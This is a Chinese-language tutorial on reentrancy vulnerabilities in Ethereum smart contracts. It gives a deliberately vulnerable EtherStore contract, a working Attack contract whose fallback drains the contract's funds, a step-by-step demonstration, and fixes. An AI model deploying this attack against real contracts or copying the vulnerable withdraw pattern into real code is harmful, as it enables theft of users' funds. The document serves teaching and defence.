重入漏洞
==

漏洞介绍
--

重入攻击(Reentrancy Attack)首次出现于以太坊，对应的真实攻击为 The DAO 攻击，此次攻击还导致了原来的以太坊分叉成以太经典(ETC)和现在的以太坊(ETH)。由于项目方采用的转账模型为先给用户发送转账然后才对用户的余额状态进行修改，导致恶意用户可以构造恶意合约，在接受转账的同时再次调用项目方的转账函数。利用这样的方法，导致用户的余额状态一直没有被改变，却能一直提取项目方资金，最终导致项目方资金被耗光。  


漏洞案例
--

1.部署一个包含重入漏洞的合约<code>EtherStore</code>  

    contract EtherStore {
        mapping(address => uint) public balances;

        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }

        function withdraw() public {
            uint bal = balances[msg.sender];
            require(bal > 0);

            (bool sent, ) = msg.sender.call{value: bal}("");
            require(sent, "Failed to send Ether");

            balances[msg.sender] = 0;
        }

        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }
    
2.向<code>EtherStore</code>存入任意ETH，这里存入4个ETH  

![tempsnip](https://user-images.githubusercontent.com/35074461/197673688-924bfb1d-c253-4959-b7a7-b9f4acc3c9e9.png)


3.查看<code>EtherStore</code>余额，为4ETH  

![image](https://user-images.githubusercontent.com/35074461/197672627-c8e42e69-9233-4589-a15f-d722bd759608.png)

4.部署攻击合约<code>Attack</code>，地址填入<code>EtherStore</code>合约地址

    contract Attack {
        EtherStore public etherStore;

        constructor(address _etherStoreAddress) {
            etherStore = EtherStore(_etherStoreAddress);
        }

        // Fallback is called when EtherStore sends Ether to this contract.
        fallback() external payable {
            if (address(etherStore).balance >= 1 ether) {
                etherStore.withdraw();
            }
        }

        function attack() external payable {
            require(msg.value >= 1 ether);
            etherStore.deposit{value: 1 ether}();
            etherStore.withdraw();
        }

        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }
5.使用<code>attack()</code>方法，向<code>EtherStore</code>合约转账1个ETH  

![image](https://user-images.githubusercontent.com/35074461/197674208-c5e45461-c663-4650-8853-58f31a713541.png)  

6.查看<code>Attack</code>合约余额发现为5个ETH，获得了4个ETH

![image](https://user-images.githubusercontent.com/35074461/197674478-73777950-7047-4ac9-b8ed-75d520101978.png)

漏洞分析
--

在<code>Attack</code>合约中,<code>attack()</code>方法会先向<code>EtherStore</code>合约转账一个ETH  

    etherStore.deposit{value: 1 ether}();  
    
然后请求<code>EtherStore</code>合约的<code>withdraw()</code>方法进行退款  

    etherStore.withdraw();  
    
漏洞出现在<code>withdraw()</code>方法中，合约会先判断账户是否有余额，如果有余额就使用call方法进行退款  

    (bool sent, ) = msg.sender.call{value: bal}("");  
    
然后才将账户余额置零  

    balances[msg.sender] = 0;  

当<code>Attack</code>合约收到转帐时会触发<code>fallback()</code>回调函数，在回调函数中会判断<code>EtherStore</code>合约是否还有余额，有的话就继续调用<code>withdraw()</code>方法  

    if (address(etherStore).balance >= 1 ether) {
        etherStore.withdraw();
    }

因为对攻击合约余额的判断在退款之后，所以会形成递归，每次退回1ETH直至<code>EtherStore</code>合约余额为空  

加固建议
--

1.状态变更需要在外部合约调用前完成  

2.使用防止重入的函数修饰  

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.13;

    contract ReEntrancyGuard {
        bool internal locked;

        modifier noReentrant() {
            require(!locked, "No re-entrancy");
            locked = true;
            _;
            locked = false;
        }
    }
